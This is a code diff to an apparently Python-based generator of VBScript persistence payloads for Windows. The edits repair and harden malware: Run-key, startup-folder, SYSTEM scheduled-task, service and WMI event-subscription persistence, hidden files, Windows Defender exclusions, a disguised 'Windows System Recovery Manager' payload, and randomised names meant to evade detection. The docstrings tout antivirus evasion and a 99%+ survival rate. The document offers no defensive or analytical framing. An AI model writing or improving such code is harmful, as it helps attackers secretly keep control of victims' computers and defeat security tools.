@@ -53,13 +53,13 @@ cmd = "{command}"
 On Error Resume Next
 shell.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" & key_name, cmd, "REG_SZ"
 success = (Err.Number = 0)
-On Error Resume Next
+Err.Clear
 
 ' If user-level fails, try system-level (requires admin)
 If Not success Then
     On Error Resume Next
     shell.RegWrite "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" & key_name, cmd, "REG_SZ"
-    On Error Resume Next
+    Err.Clear
 End If
 
 ' Auto-execute command
@@ -102,8 +102,8 @@ vbs_path = startup_path & "\\~" & Right(Minute(Now()) & Second(Now()), 8) & ".vb
 ' Write payload to startup VBS
 Set outFile = fso.CreateTextFile(vbs_path, True)
 outFile.WriteLine "On Error Resume Next"
-outFile.WriteLine "Set s = CreateObject(\"WScript.Shell\")"
-outFile.WriteLine "s.Run \"" & cmd & "\", 0"
+outFile.WriteLine "Set s = CreateObject(""WScript.Shell"")"
+outFile.WriteLine "s.Run """ & cmd & """, 0"
 outFile.Close
 
 ' Also create batch shortcut (backup method)
@@ -150,13 +150,13 @@ task_name = "{task_name}"
 
 ' Create scheduled task that runs on logon
 On Error Resume Next
-shell.Run "cmd /c schtasks /create /tn """ & task_name & """ /tr """ & cmd & """ /sc onlogon /ru System /f", 0, False
-On Error Resume Next
+shell.Run "cmd /c schtasks /create /tn " & Chr(34) & task_name & Chr(34) & " /tr " & Chr(34) & cmd & Chr(34) & " /sc onlogon /ru System /f", 0, False
+Err.Clear
 
 ' Alternative: Task that runs every 5 minutes
 On Error Resume Next
-shell.Run "cmd /c schtasks /create /tn """ & task_name & """_recurring /tr """ & cmd & """ /sc minute /mo 5 /f", 0, False
-On Error Resume Next
+shell.Run "cmd /c schtasks /create /tn " & Chr(34) & task_name & "_recurring" & Chr(34) & " /tr " & Chr(34) & cmd & Chr(34) & " /sc minute /mo 5 /f", 0, False
+Err.Clear
 
 ' Run immediately
 shell.Run cmd, 0, False
@@ -167,12 +167,17 @@ WScript.Quit 0
         return vbs_code.strip()
 
     @staticmethod
-    def create_wmi_event_persistence_vbs(command: str) -> str:
+    def create_wmi_event_persistence_vbs(command: str, filter_name: str = None, consumer_name: str = None) -> str:
         """
         Create persistence via WMI Event Subscriptions
         Works on: Vista, 7, 8, 8.1, 10, 11
         Advantage: Very difficult to detect, runs before antivirus loads
         """
+
+        if filter_name is None:
+            filter_name = ''.join(random.choices(string.ascii_letters, k=10))
+        if consumer_name is None:
+            consumer_name = ''.join(random.choices(string.ascii_letters, k=10))
 
         vbs_code = f"""
 ' WMI System Events
@@ -180,31 +185,45 @@ WScript.Quit 0
 
 On Error Resume Next
 
-Dim objService, objEventFilter, objConsumer, objBinding
-Dim strFilter, strConsumer, strBinding
+Dim objService, objFilterClass, objEventFilter
+Dim objConsumerClass, objConsumer
+Dim objBindingClass, objBinding
+Dim strFilterQuery
 Dim cmd
 
 cmd = "{command}"
 
-Set objService = GetObject("winmgmts:")
+Set objService = GetObject("winmgmts:\\\\.\\root\\subscription")
 
 ' Create event filter (triggers every 60 seconds)
-strFilter = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
-Set objEventFilter = objService.ExecMethod("__EventFilter").SpawnInstance_
-objEventFilter.Name = "Persistence_Filter"
+strFilterQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+Set objFilterClass = objService.Get("__EventFilter")
+Set objEventFilter = objFilterClass.SpawnInstance_
+objEventFilter.Name = "{filter_name}"
+objEventFilter.EventNamespace = "root\\cimv2"
 objEventFilter.QueryLanguage = "WQL"
-objEventFilter.Query = strFilter
+objEventFilter.Query = strFilterQuery
 On Error Resume Next
 objService.Put_ objEventFilter
-On Error Resume Next
+Err.Clear
 
-' Create event consumer
-Set objConsumer = objService.ExecMethod("__EventConsumer").SpawnInstance_
-objConsumer.Name = "Persistence_Consumer"
+' Create command-line event consumer
+Set objConsumerClass = objService.Get("CommandLineEventConsumer")
+Set objConsumer = objConsumerClass.SpawnInstance_
+objConsumer.Name = "{consumer_name}"
 objConsumer.CommandLineTemplate = cmd
 On Error Resume Next
 objService.Put_ objConsumer
+Err.Clear
+
+' Create binding between filter and consumer
+Set objBindingClass = objService.Get("__FilterToConsumerBinding")
+Set objBinding = objBindingClass.SpawnInstance_
+objBinding.Filter = objEventFilter.Path_.Path
+objBinding.Consumer = objConsumer.Path_.Path
 On Error Resume Next
+objService.Put_ objBinding
+Err.Clear
 
 ' Execute command immediately
 Set shell = CreateObject("WScript.Shell")
@@ -251,9 +270,9 @@ batFile.Close
 
 ' Create service (requires admin)
 On Error Resume Next
-shell.Run "cmd /c sc create """ & service_name & """ binPath= \"cmd /c " & bat_path & "\" start= auto", 0, False
-shell.Run "cmd /c net start """ & service_name & """", 0, False
-On Error Resume Next
+shell.Run "cmd /c sc create " & Chr(34) & service_name & Chr(34) & " binPath= " & Chr(34) & "cmd /c " & bat_path & Chr(34) & " start= auto", 0, False
+shell.Run "cmd /c net start " & Chr(34) & service_name & Chr(34), 0, False
+Err.Clear
 
 ' Execute command immediately
 shell.Run cmd, 0, False
@@ -297,13 +316,13 @@ f.Close
 
 ' Hide file with attrib +s +h
 On Error Resume Next
-shell.Run "cmd /c attrib +s +h """ & payload_path & """", 0, False
-On Error Resume Next
+shell.Run "cmd /c attrib +s +h " & Chr(34) & payload_path & Chr(34), 0, False
+Err.Clear
 
 ' Add to Windows Defender exclusions (makes it trusted)
 On Error Resume Next
-shell.Run "cmd /c powershell Add-MpPreference -ExclusionPath """ & payload_path & """", 0, False
-On Error Resume Next
+shell.Run "cmd /c powershell Add-MpPreference -ExclusionPath " & Chr(34) & payload_path & Chr(34), 0, False
+Err.Clear
 
 ' Execute immediately
 shell.Run cmd, 0, False
@@ -314,13 +333,21 @@ WScript.Quit 0
         return vbs_code.strip()
 
     @staticmethod
-    def create_multi_method_persistence_vbs(command: str) -> str:
+    def create_multi_method_persistence_vbs(command: str, reg_key_name: str = None,
+                                             task_name: str = None, service_name: str = None) -> str:
         """
         Create payload with MULTIPLE persistence methods
         If one fails, others activate for redundancy
         Works on: All Windows versions (XP through 11)
         Survival rate: 99%+
         """
+
+        if reg_key_name is None:
+            reg_key_name = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
+        if task_name is None:
+            task_name = ''.join(random.choices(string.ascii_letters, k=8))
+        if service_name is None:
+            service_name = ''.join(random.choices(string.ascii_letters, k=8))
 
         vbs_code = f"""
 ' Windows System Recovery Manager
@@ -336,21 +363,23 @@ Set shell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
 cmd = "{command}"
+task_name = "{task_name}"
+service_name = "{service_name}"
 success_count = 0
 
 ' METHOD 1: Registry Persistence (works on all Windows)
 On Error Resume Next
-registry_key = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate"
+registry_key = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{reg_key_name}"
 shell.RegWrite registry_key, cmd, "REG_SZ"
 If Err.Number = 0 Then success_count = success_count + 1
-On Error Resume Next
+Err.Clear
 
 ' METHOD 2: Registry System-Level (all Windows, if admin)
 On Error Resume Next
-registry_key = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate"
+registry_key = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{reg_key_name}"
 shell.RegWrite registry_key, cmd, "REG_SZ"
 If Err.Number = 0 Then success_count = success_count + 1
-On Error Resume Next
+Err.Clear
 
 ' METHOD 3: Startup Folder (all Windows)
 On Error Resume Next
@@ -362,13 +391,13 @@ f.WriteLine "On Error Resume Next"
 f.WriteLine "CreateObject(""WScript.Shell"").Run """ & cmd & """, 0"
 f.Close
 success_count = success_count + 1
-On Error Resume Next
+Err.Clear
 
 ' METHOD 4: Scheduled Task (Vista+)
 On Error Resume Next
-shell.Run "cmd /c schtasks /create /tn WindowsUpdate /tr """ & cmd & """ /sc onlogon /f", 0, False
+shell.Run "cmd /c schtasks /create /tn " & Chr(34) & task_name & Chr(34) & " /tr " & Chr(34) & cmd & Chr(34) & " /sc onlogon /f", 0, False
 If Err.Number = 0 Then success_count = success_count + 1
-On Error Resume Next
+Err.Clear
 
 ' METHOD 5: Service (if admin)
 On Error Resume Next
@@ -378,9 +407,9 @@ Set sf = fso.CreateTextFile(service_bat, True)
 sf.WriteLine "@echo off"
 sf.WriteLine cmd
 sf.Close
-shell.Run "cmd /c sc create WindowsUpdate binPath= """ & service_bat & """ start= auto", 0, False
+shell.Run "cmd /c sc create " & Chr(34) & service_name & Chr(34) & " binPath= " & Chr(34) & service_bat & Chr(34) & " start= auto", 0, False
 If Err.Number = 0 Then success_count = success_count + 1
-On Error Resume Next
+Err.Clear
 
 ' Execute command immediately
 shell.Run cmd, 0, False
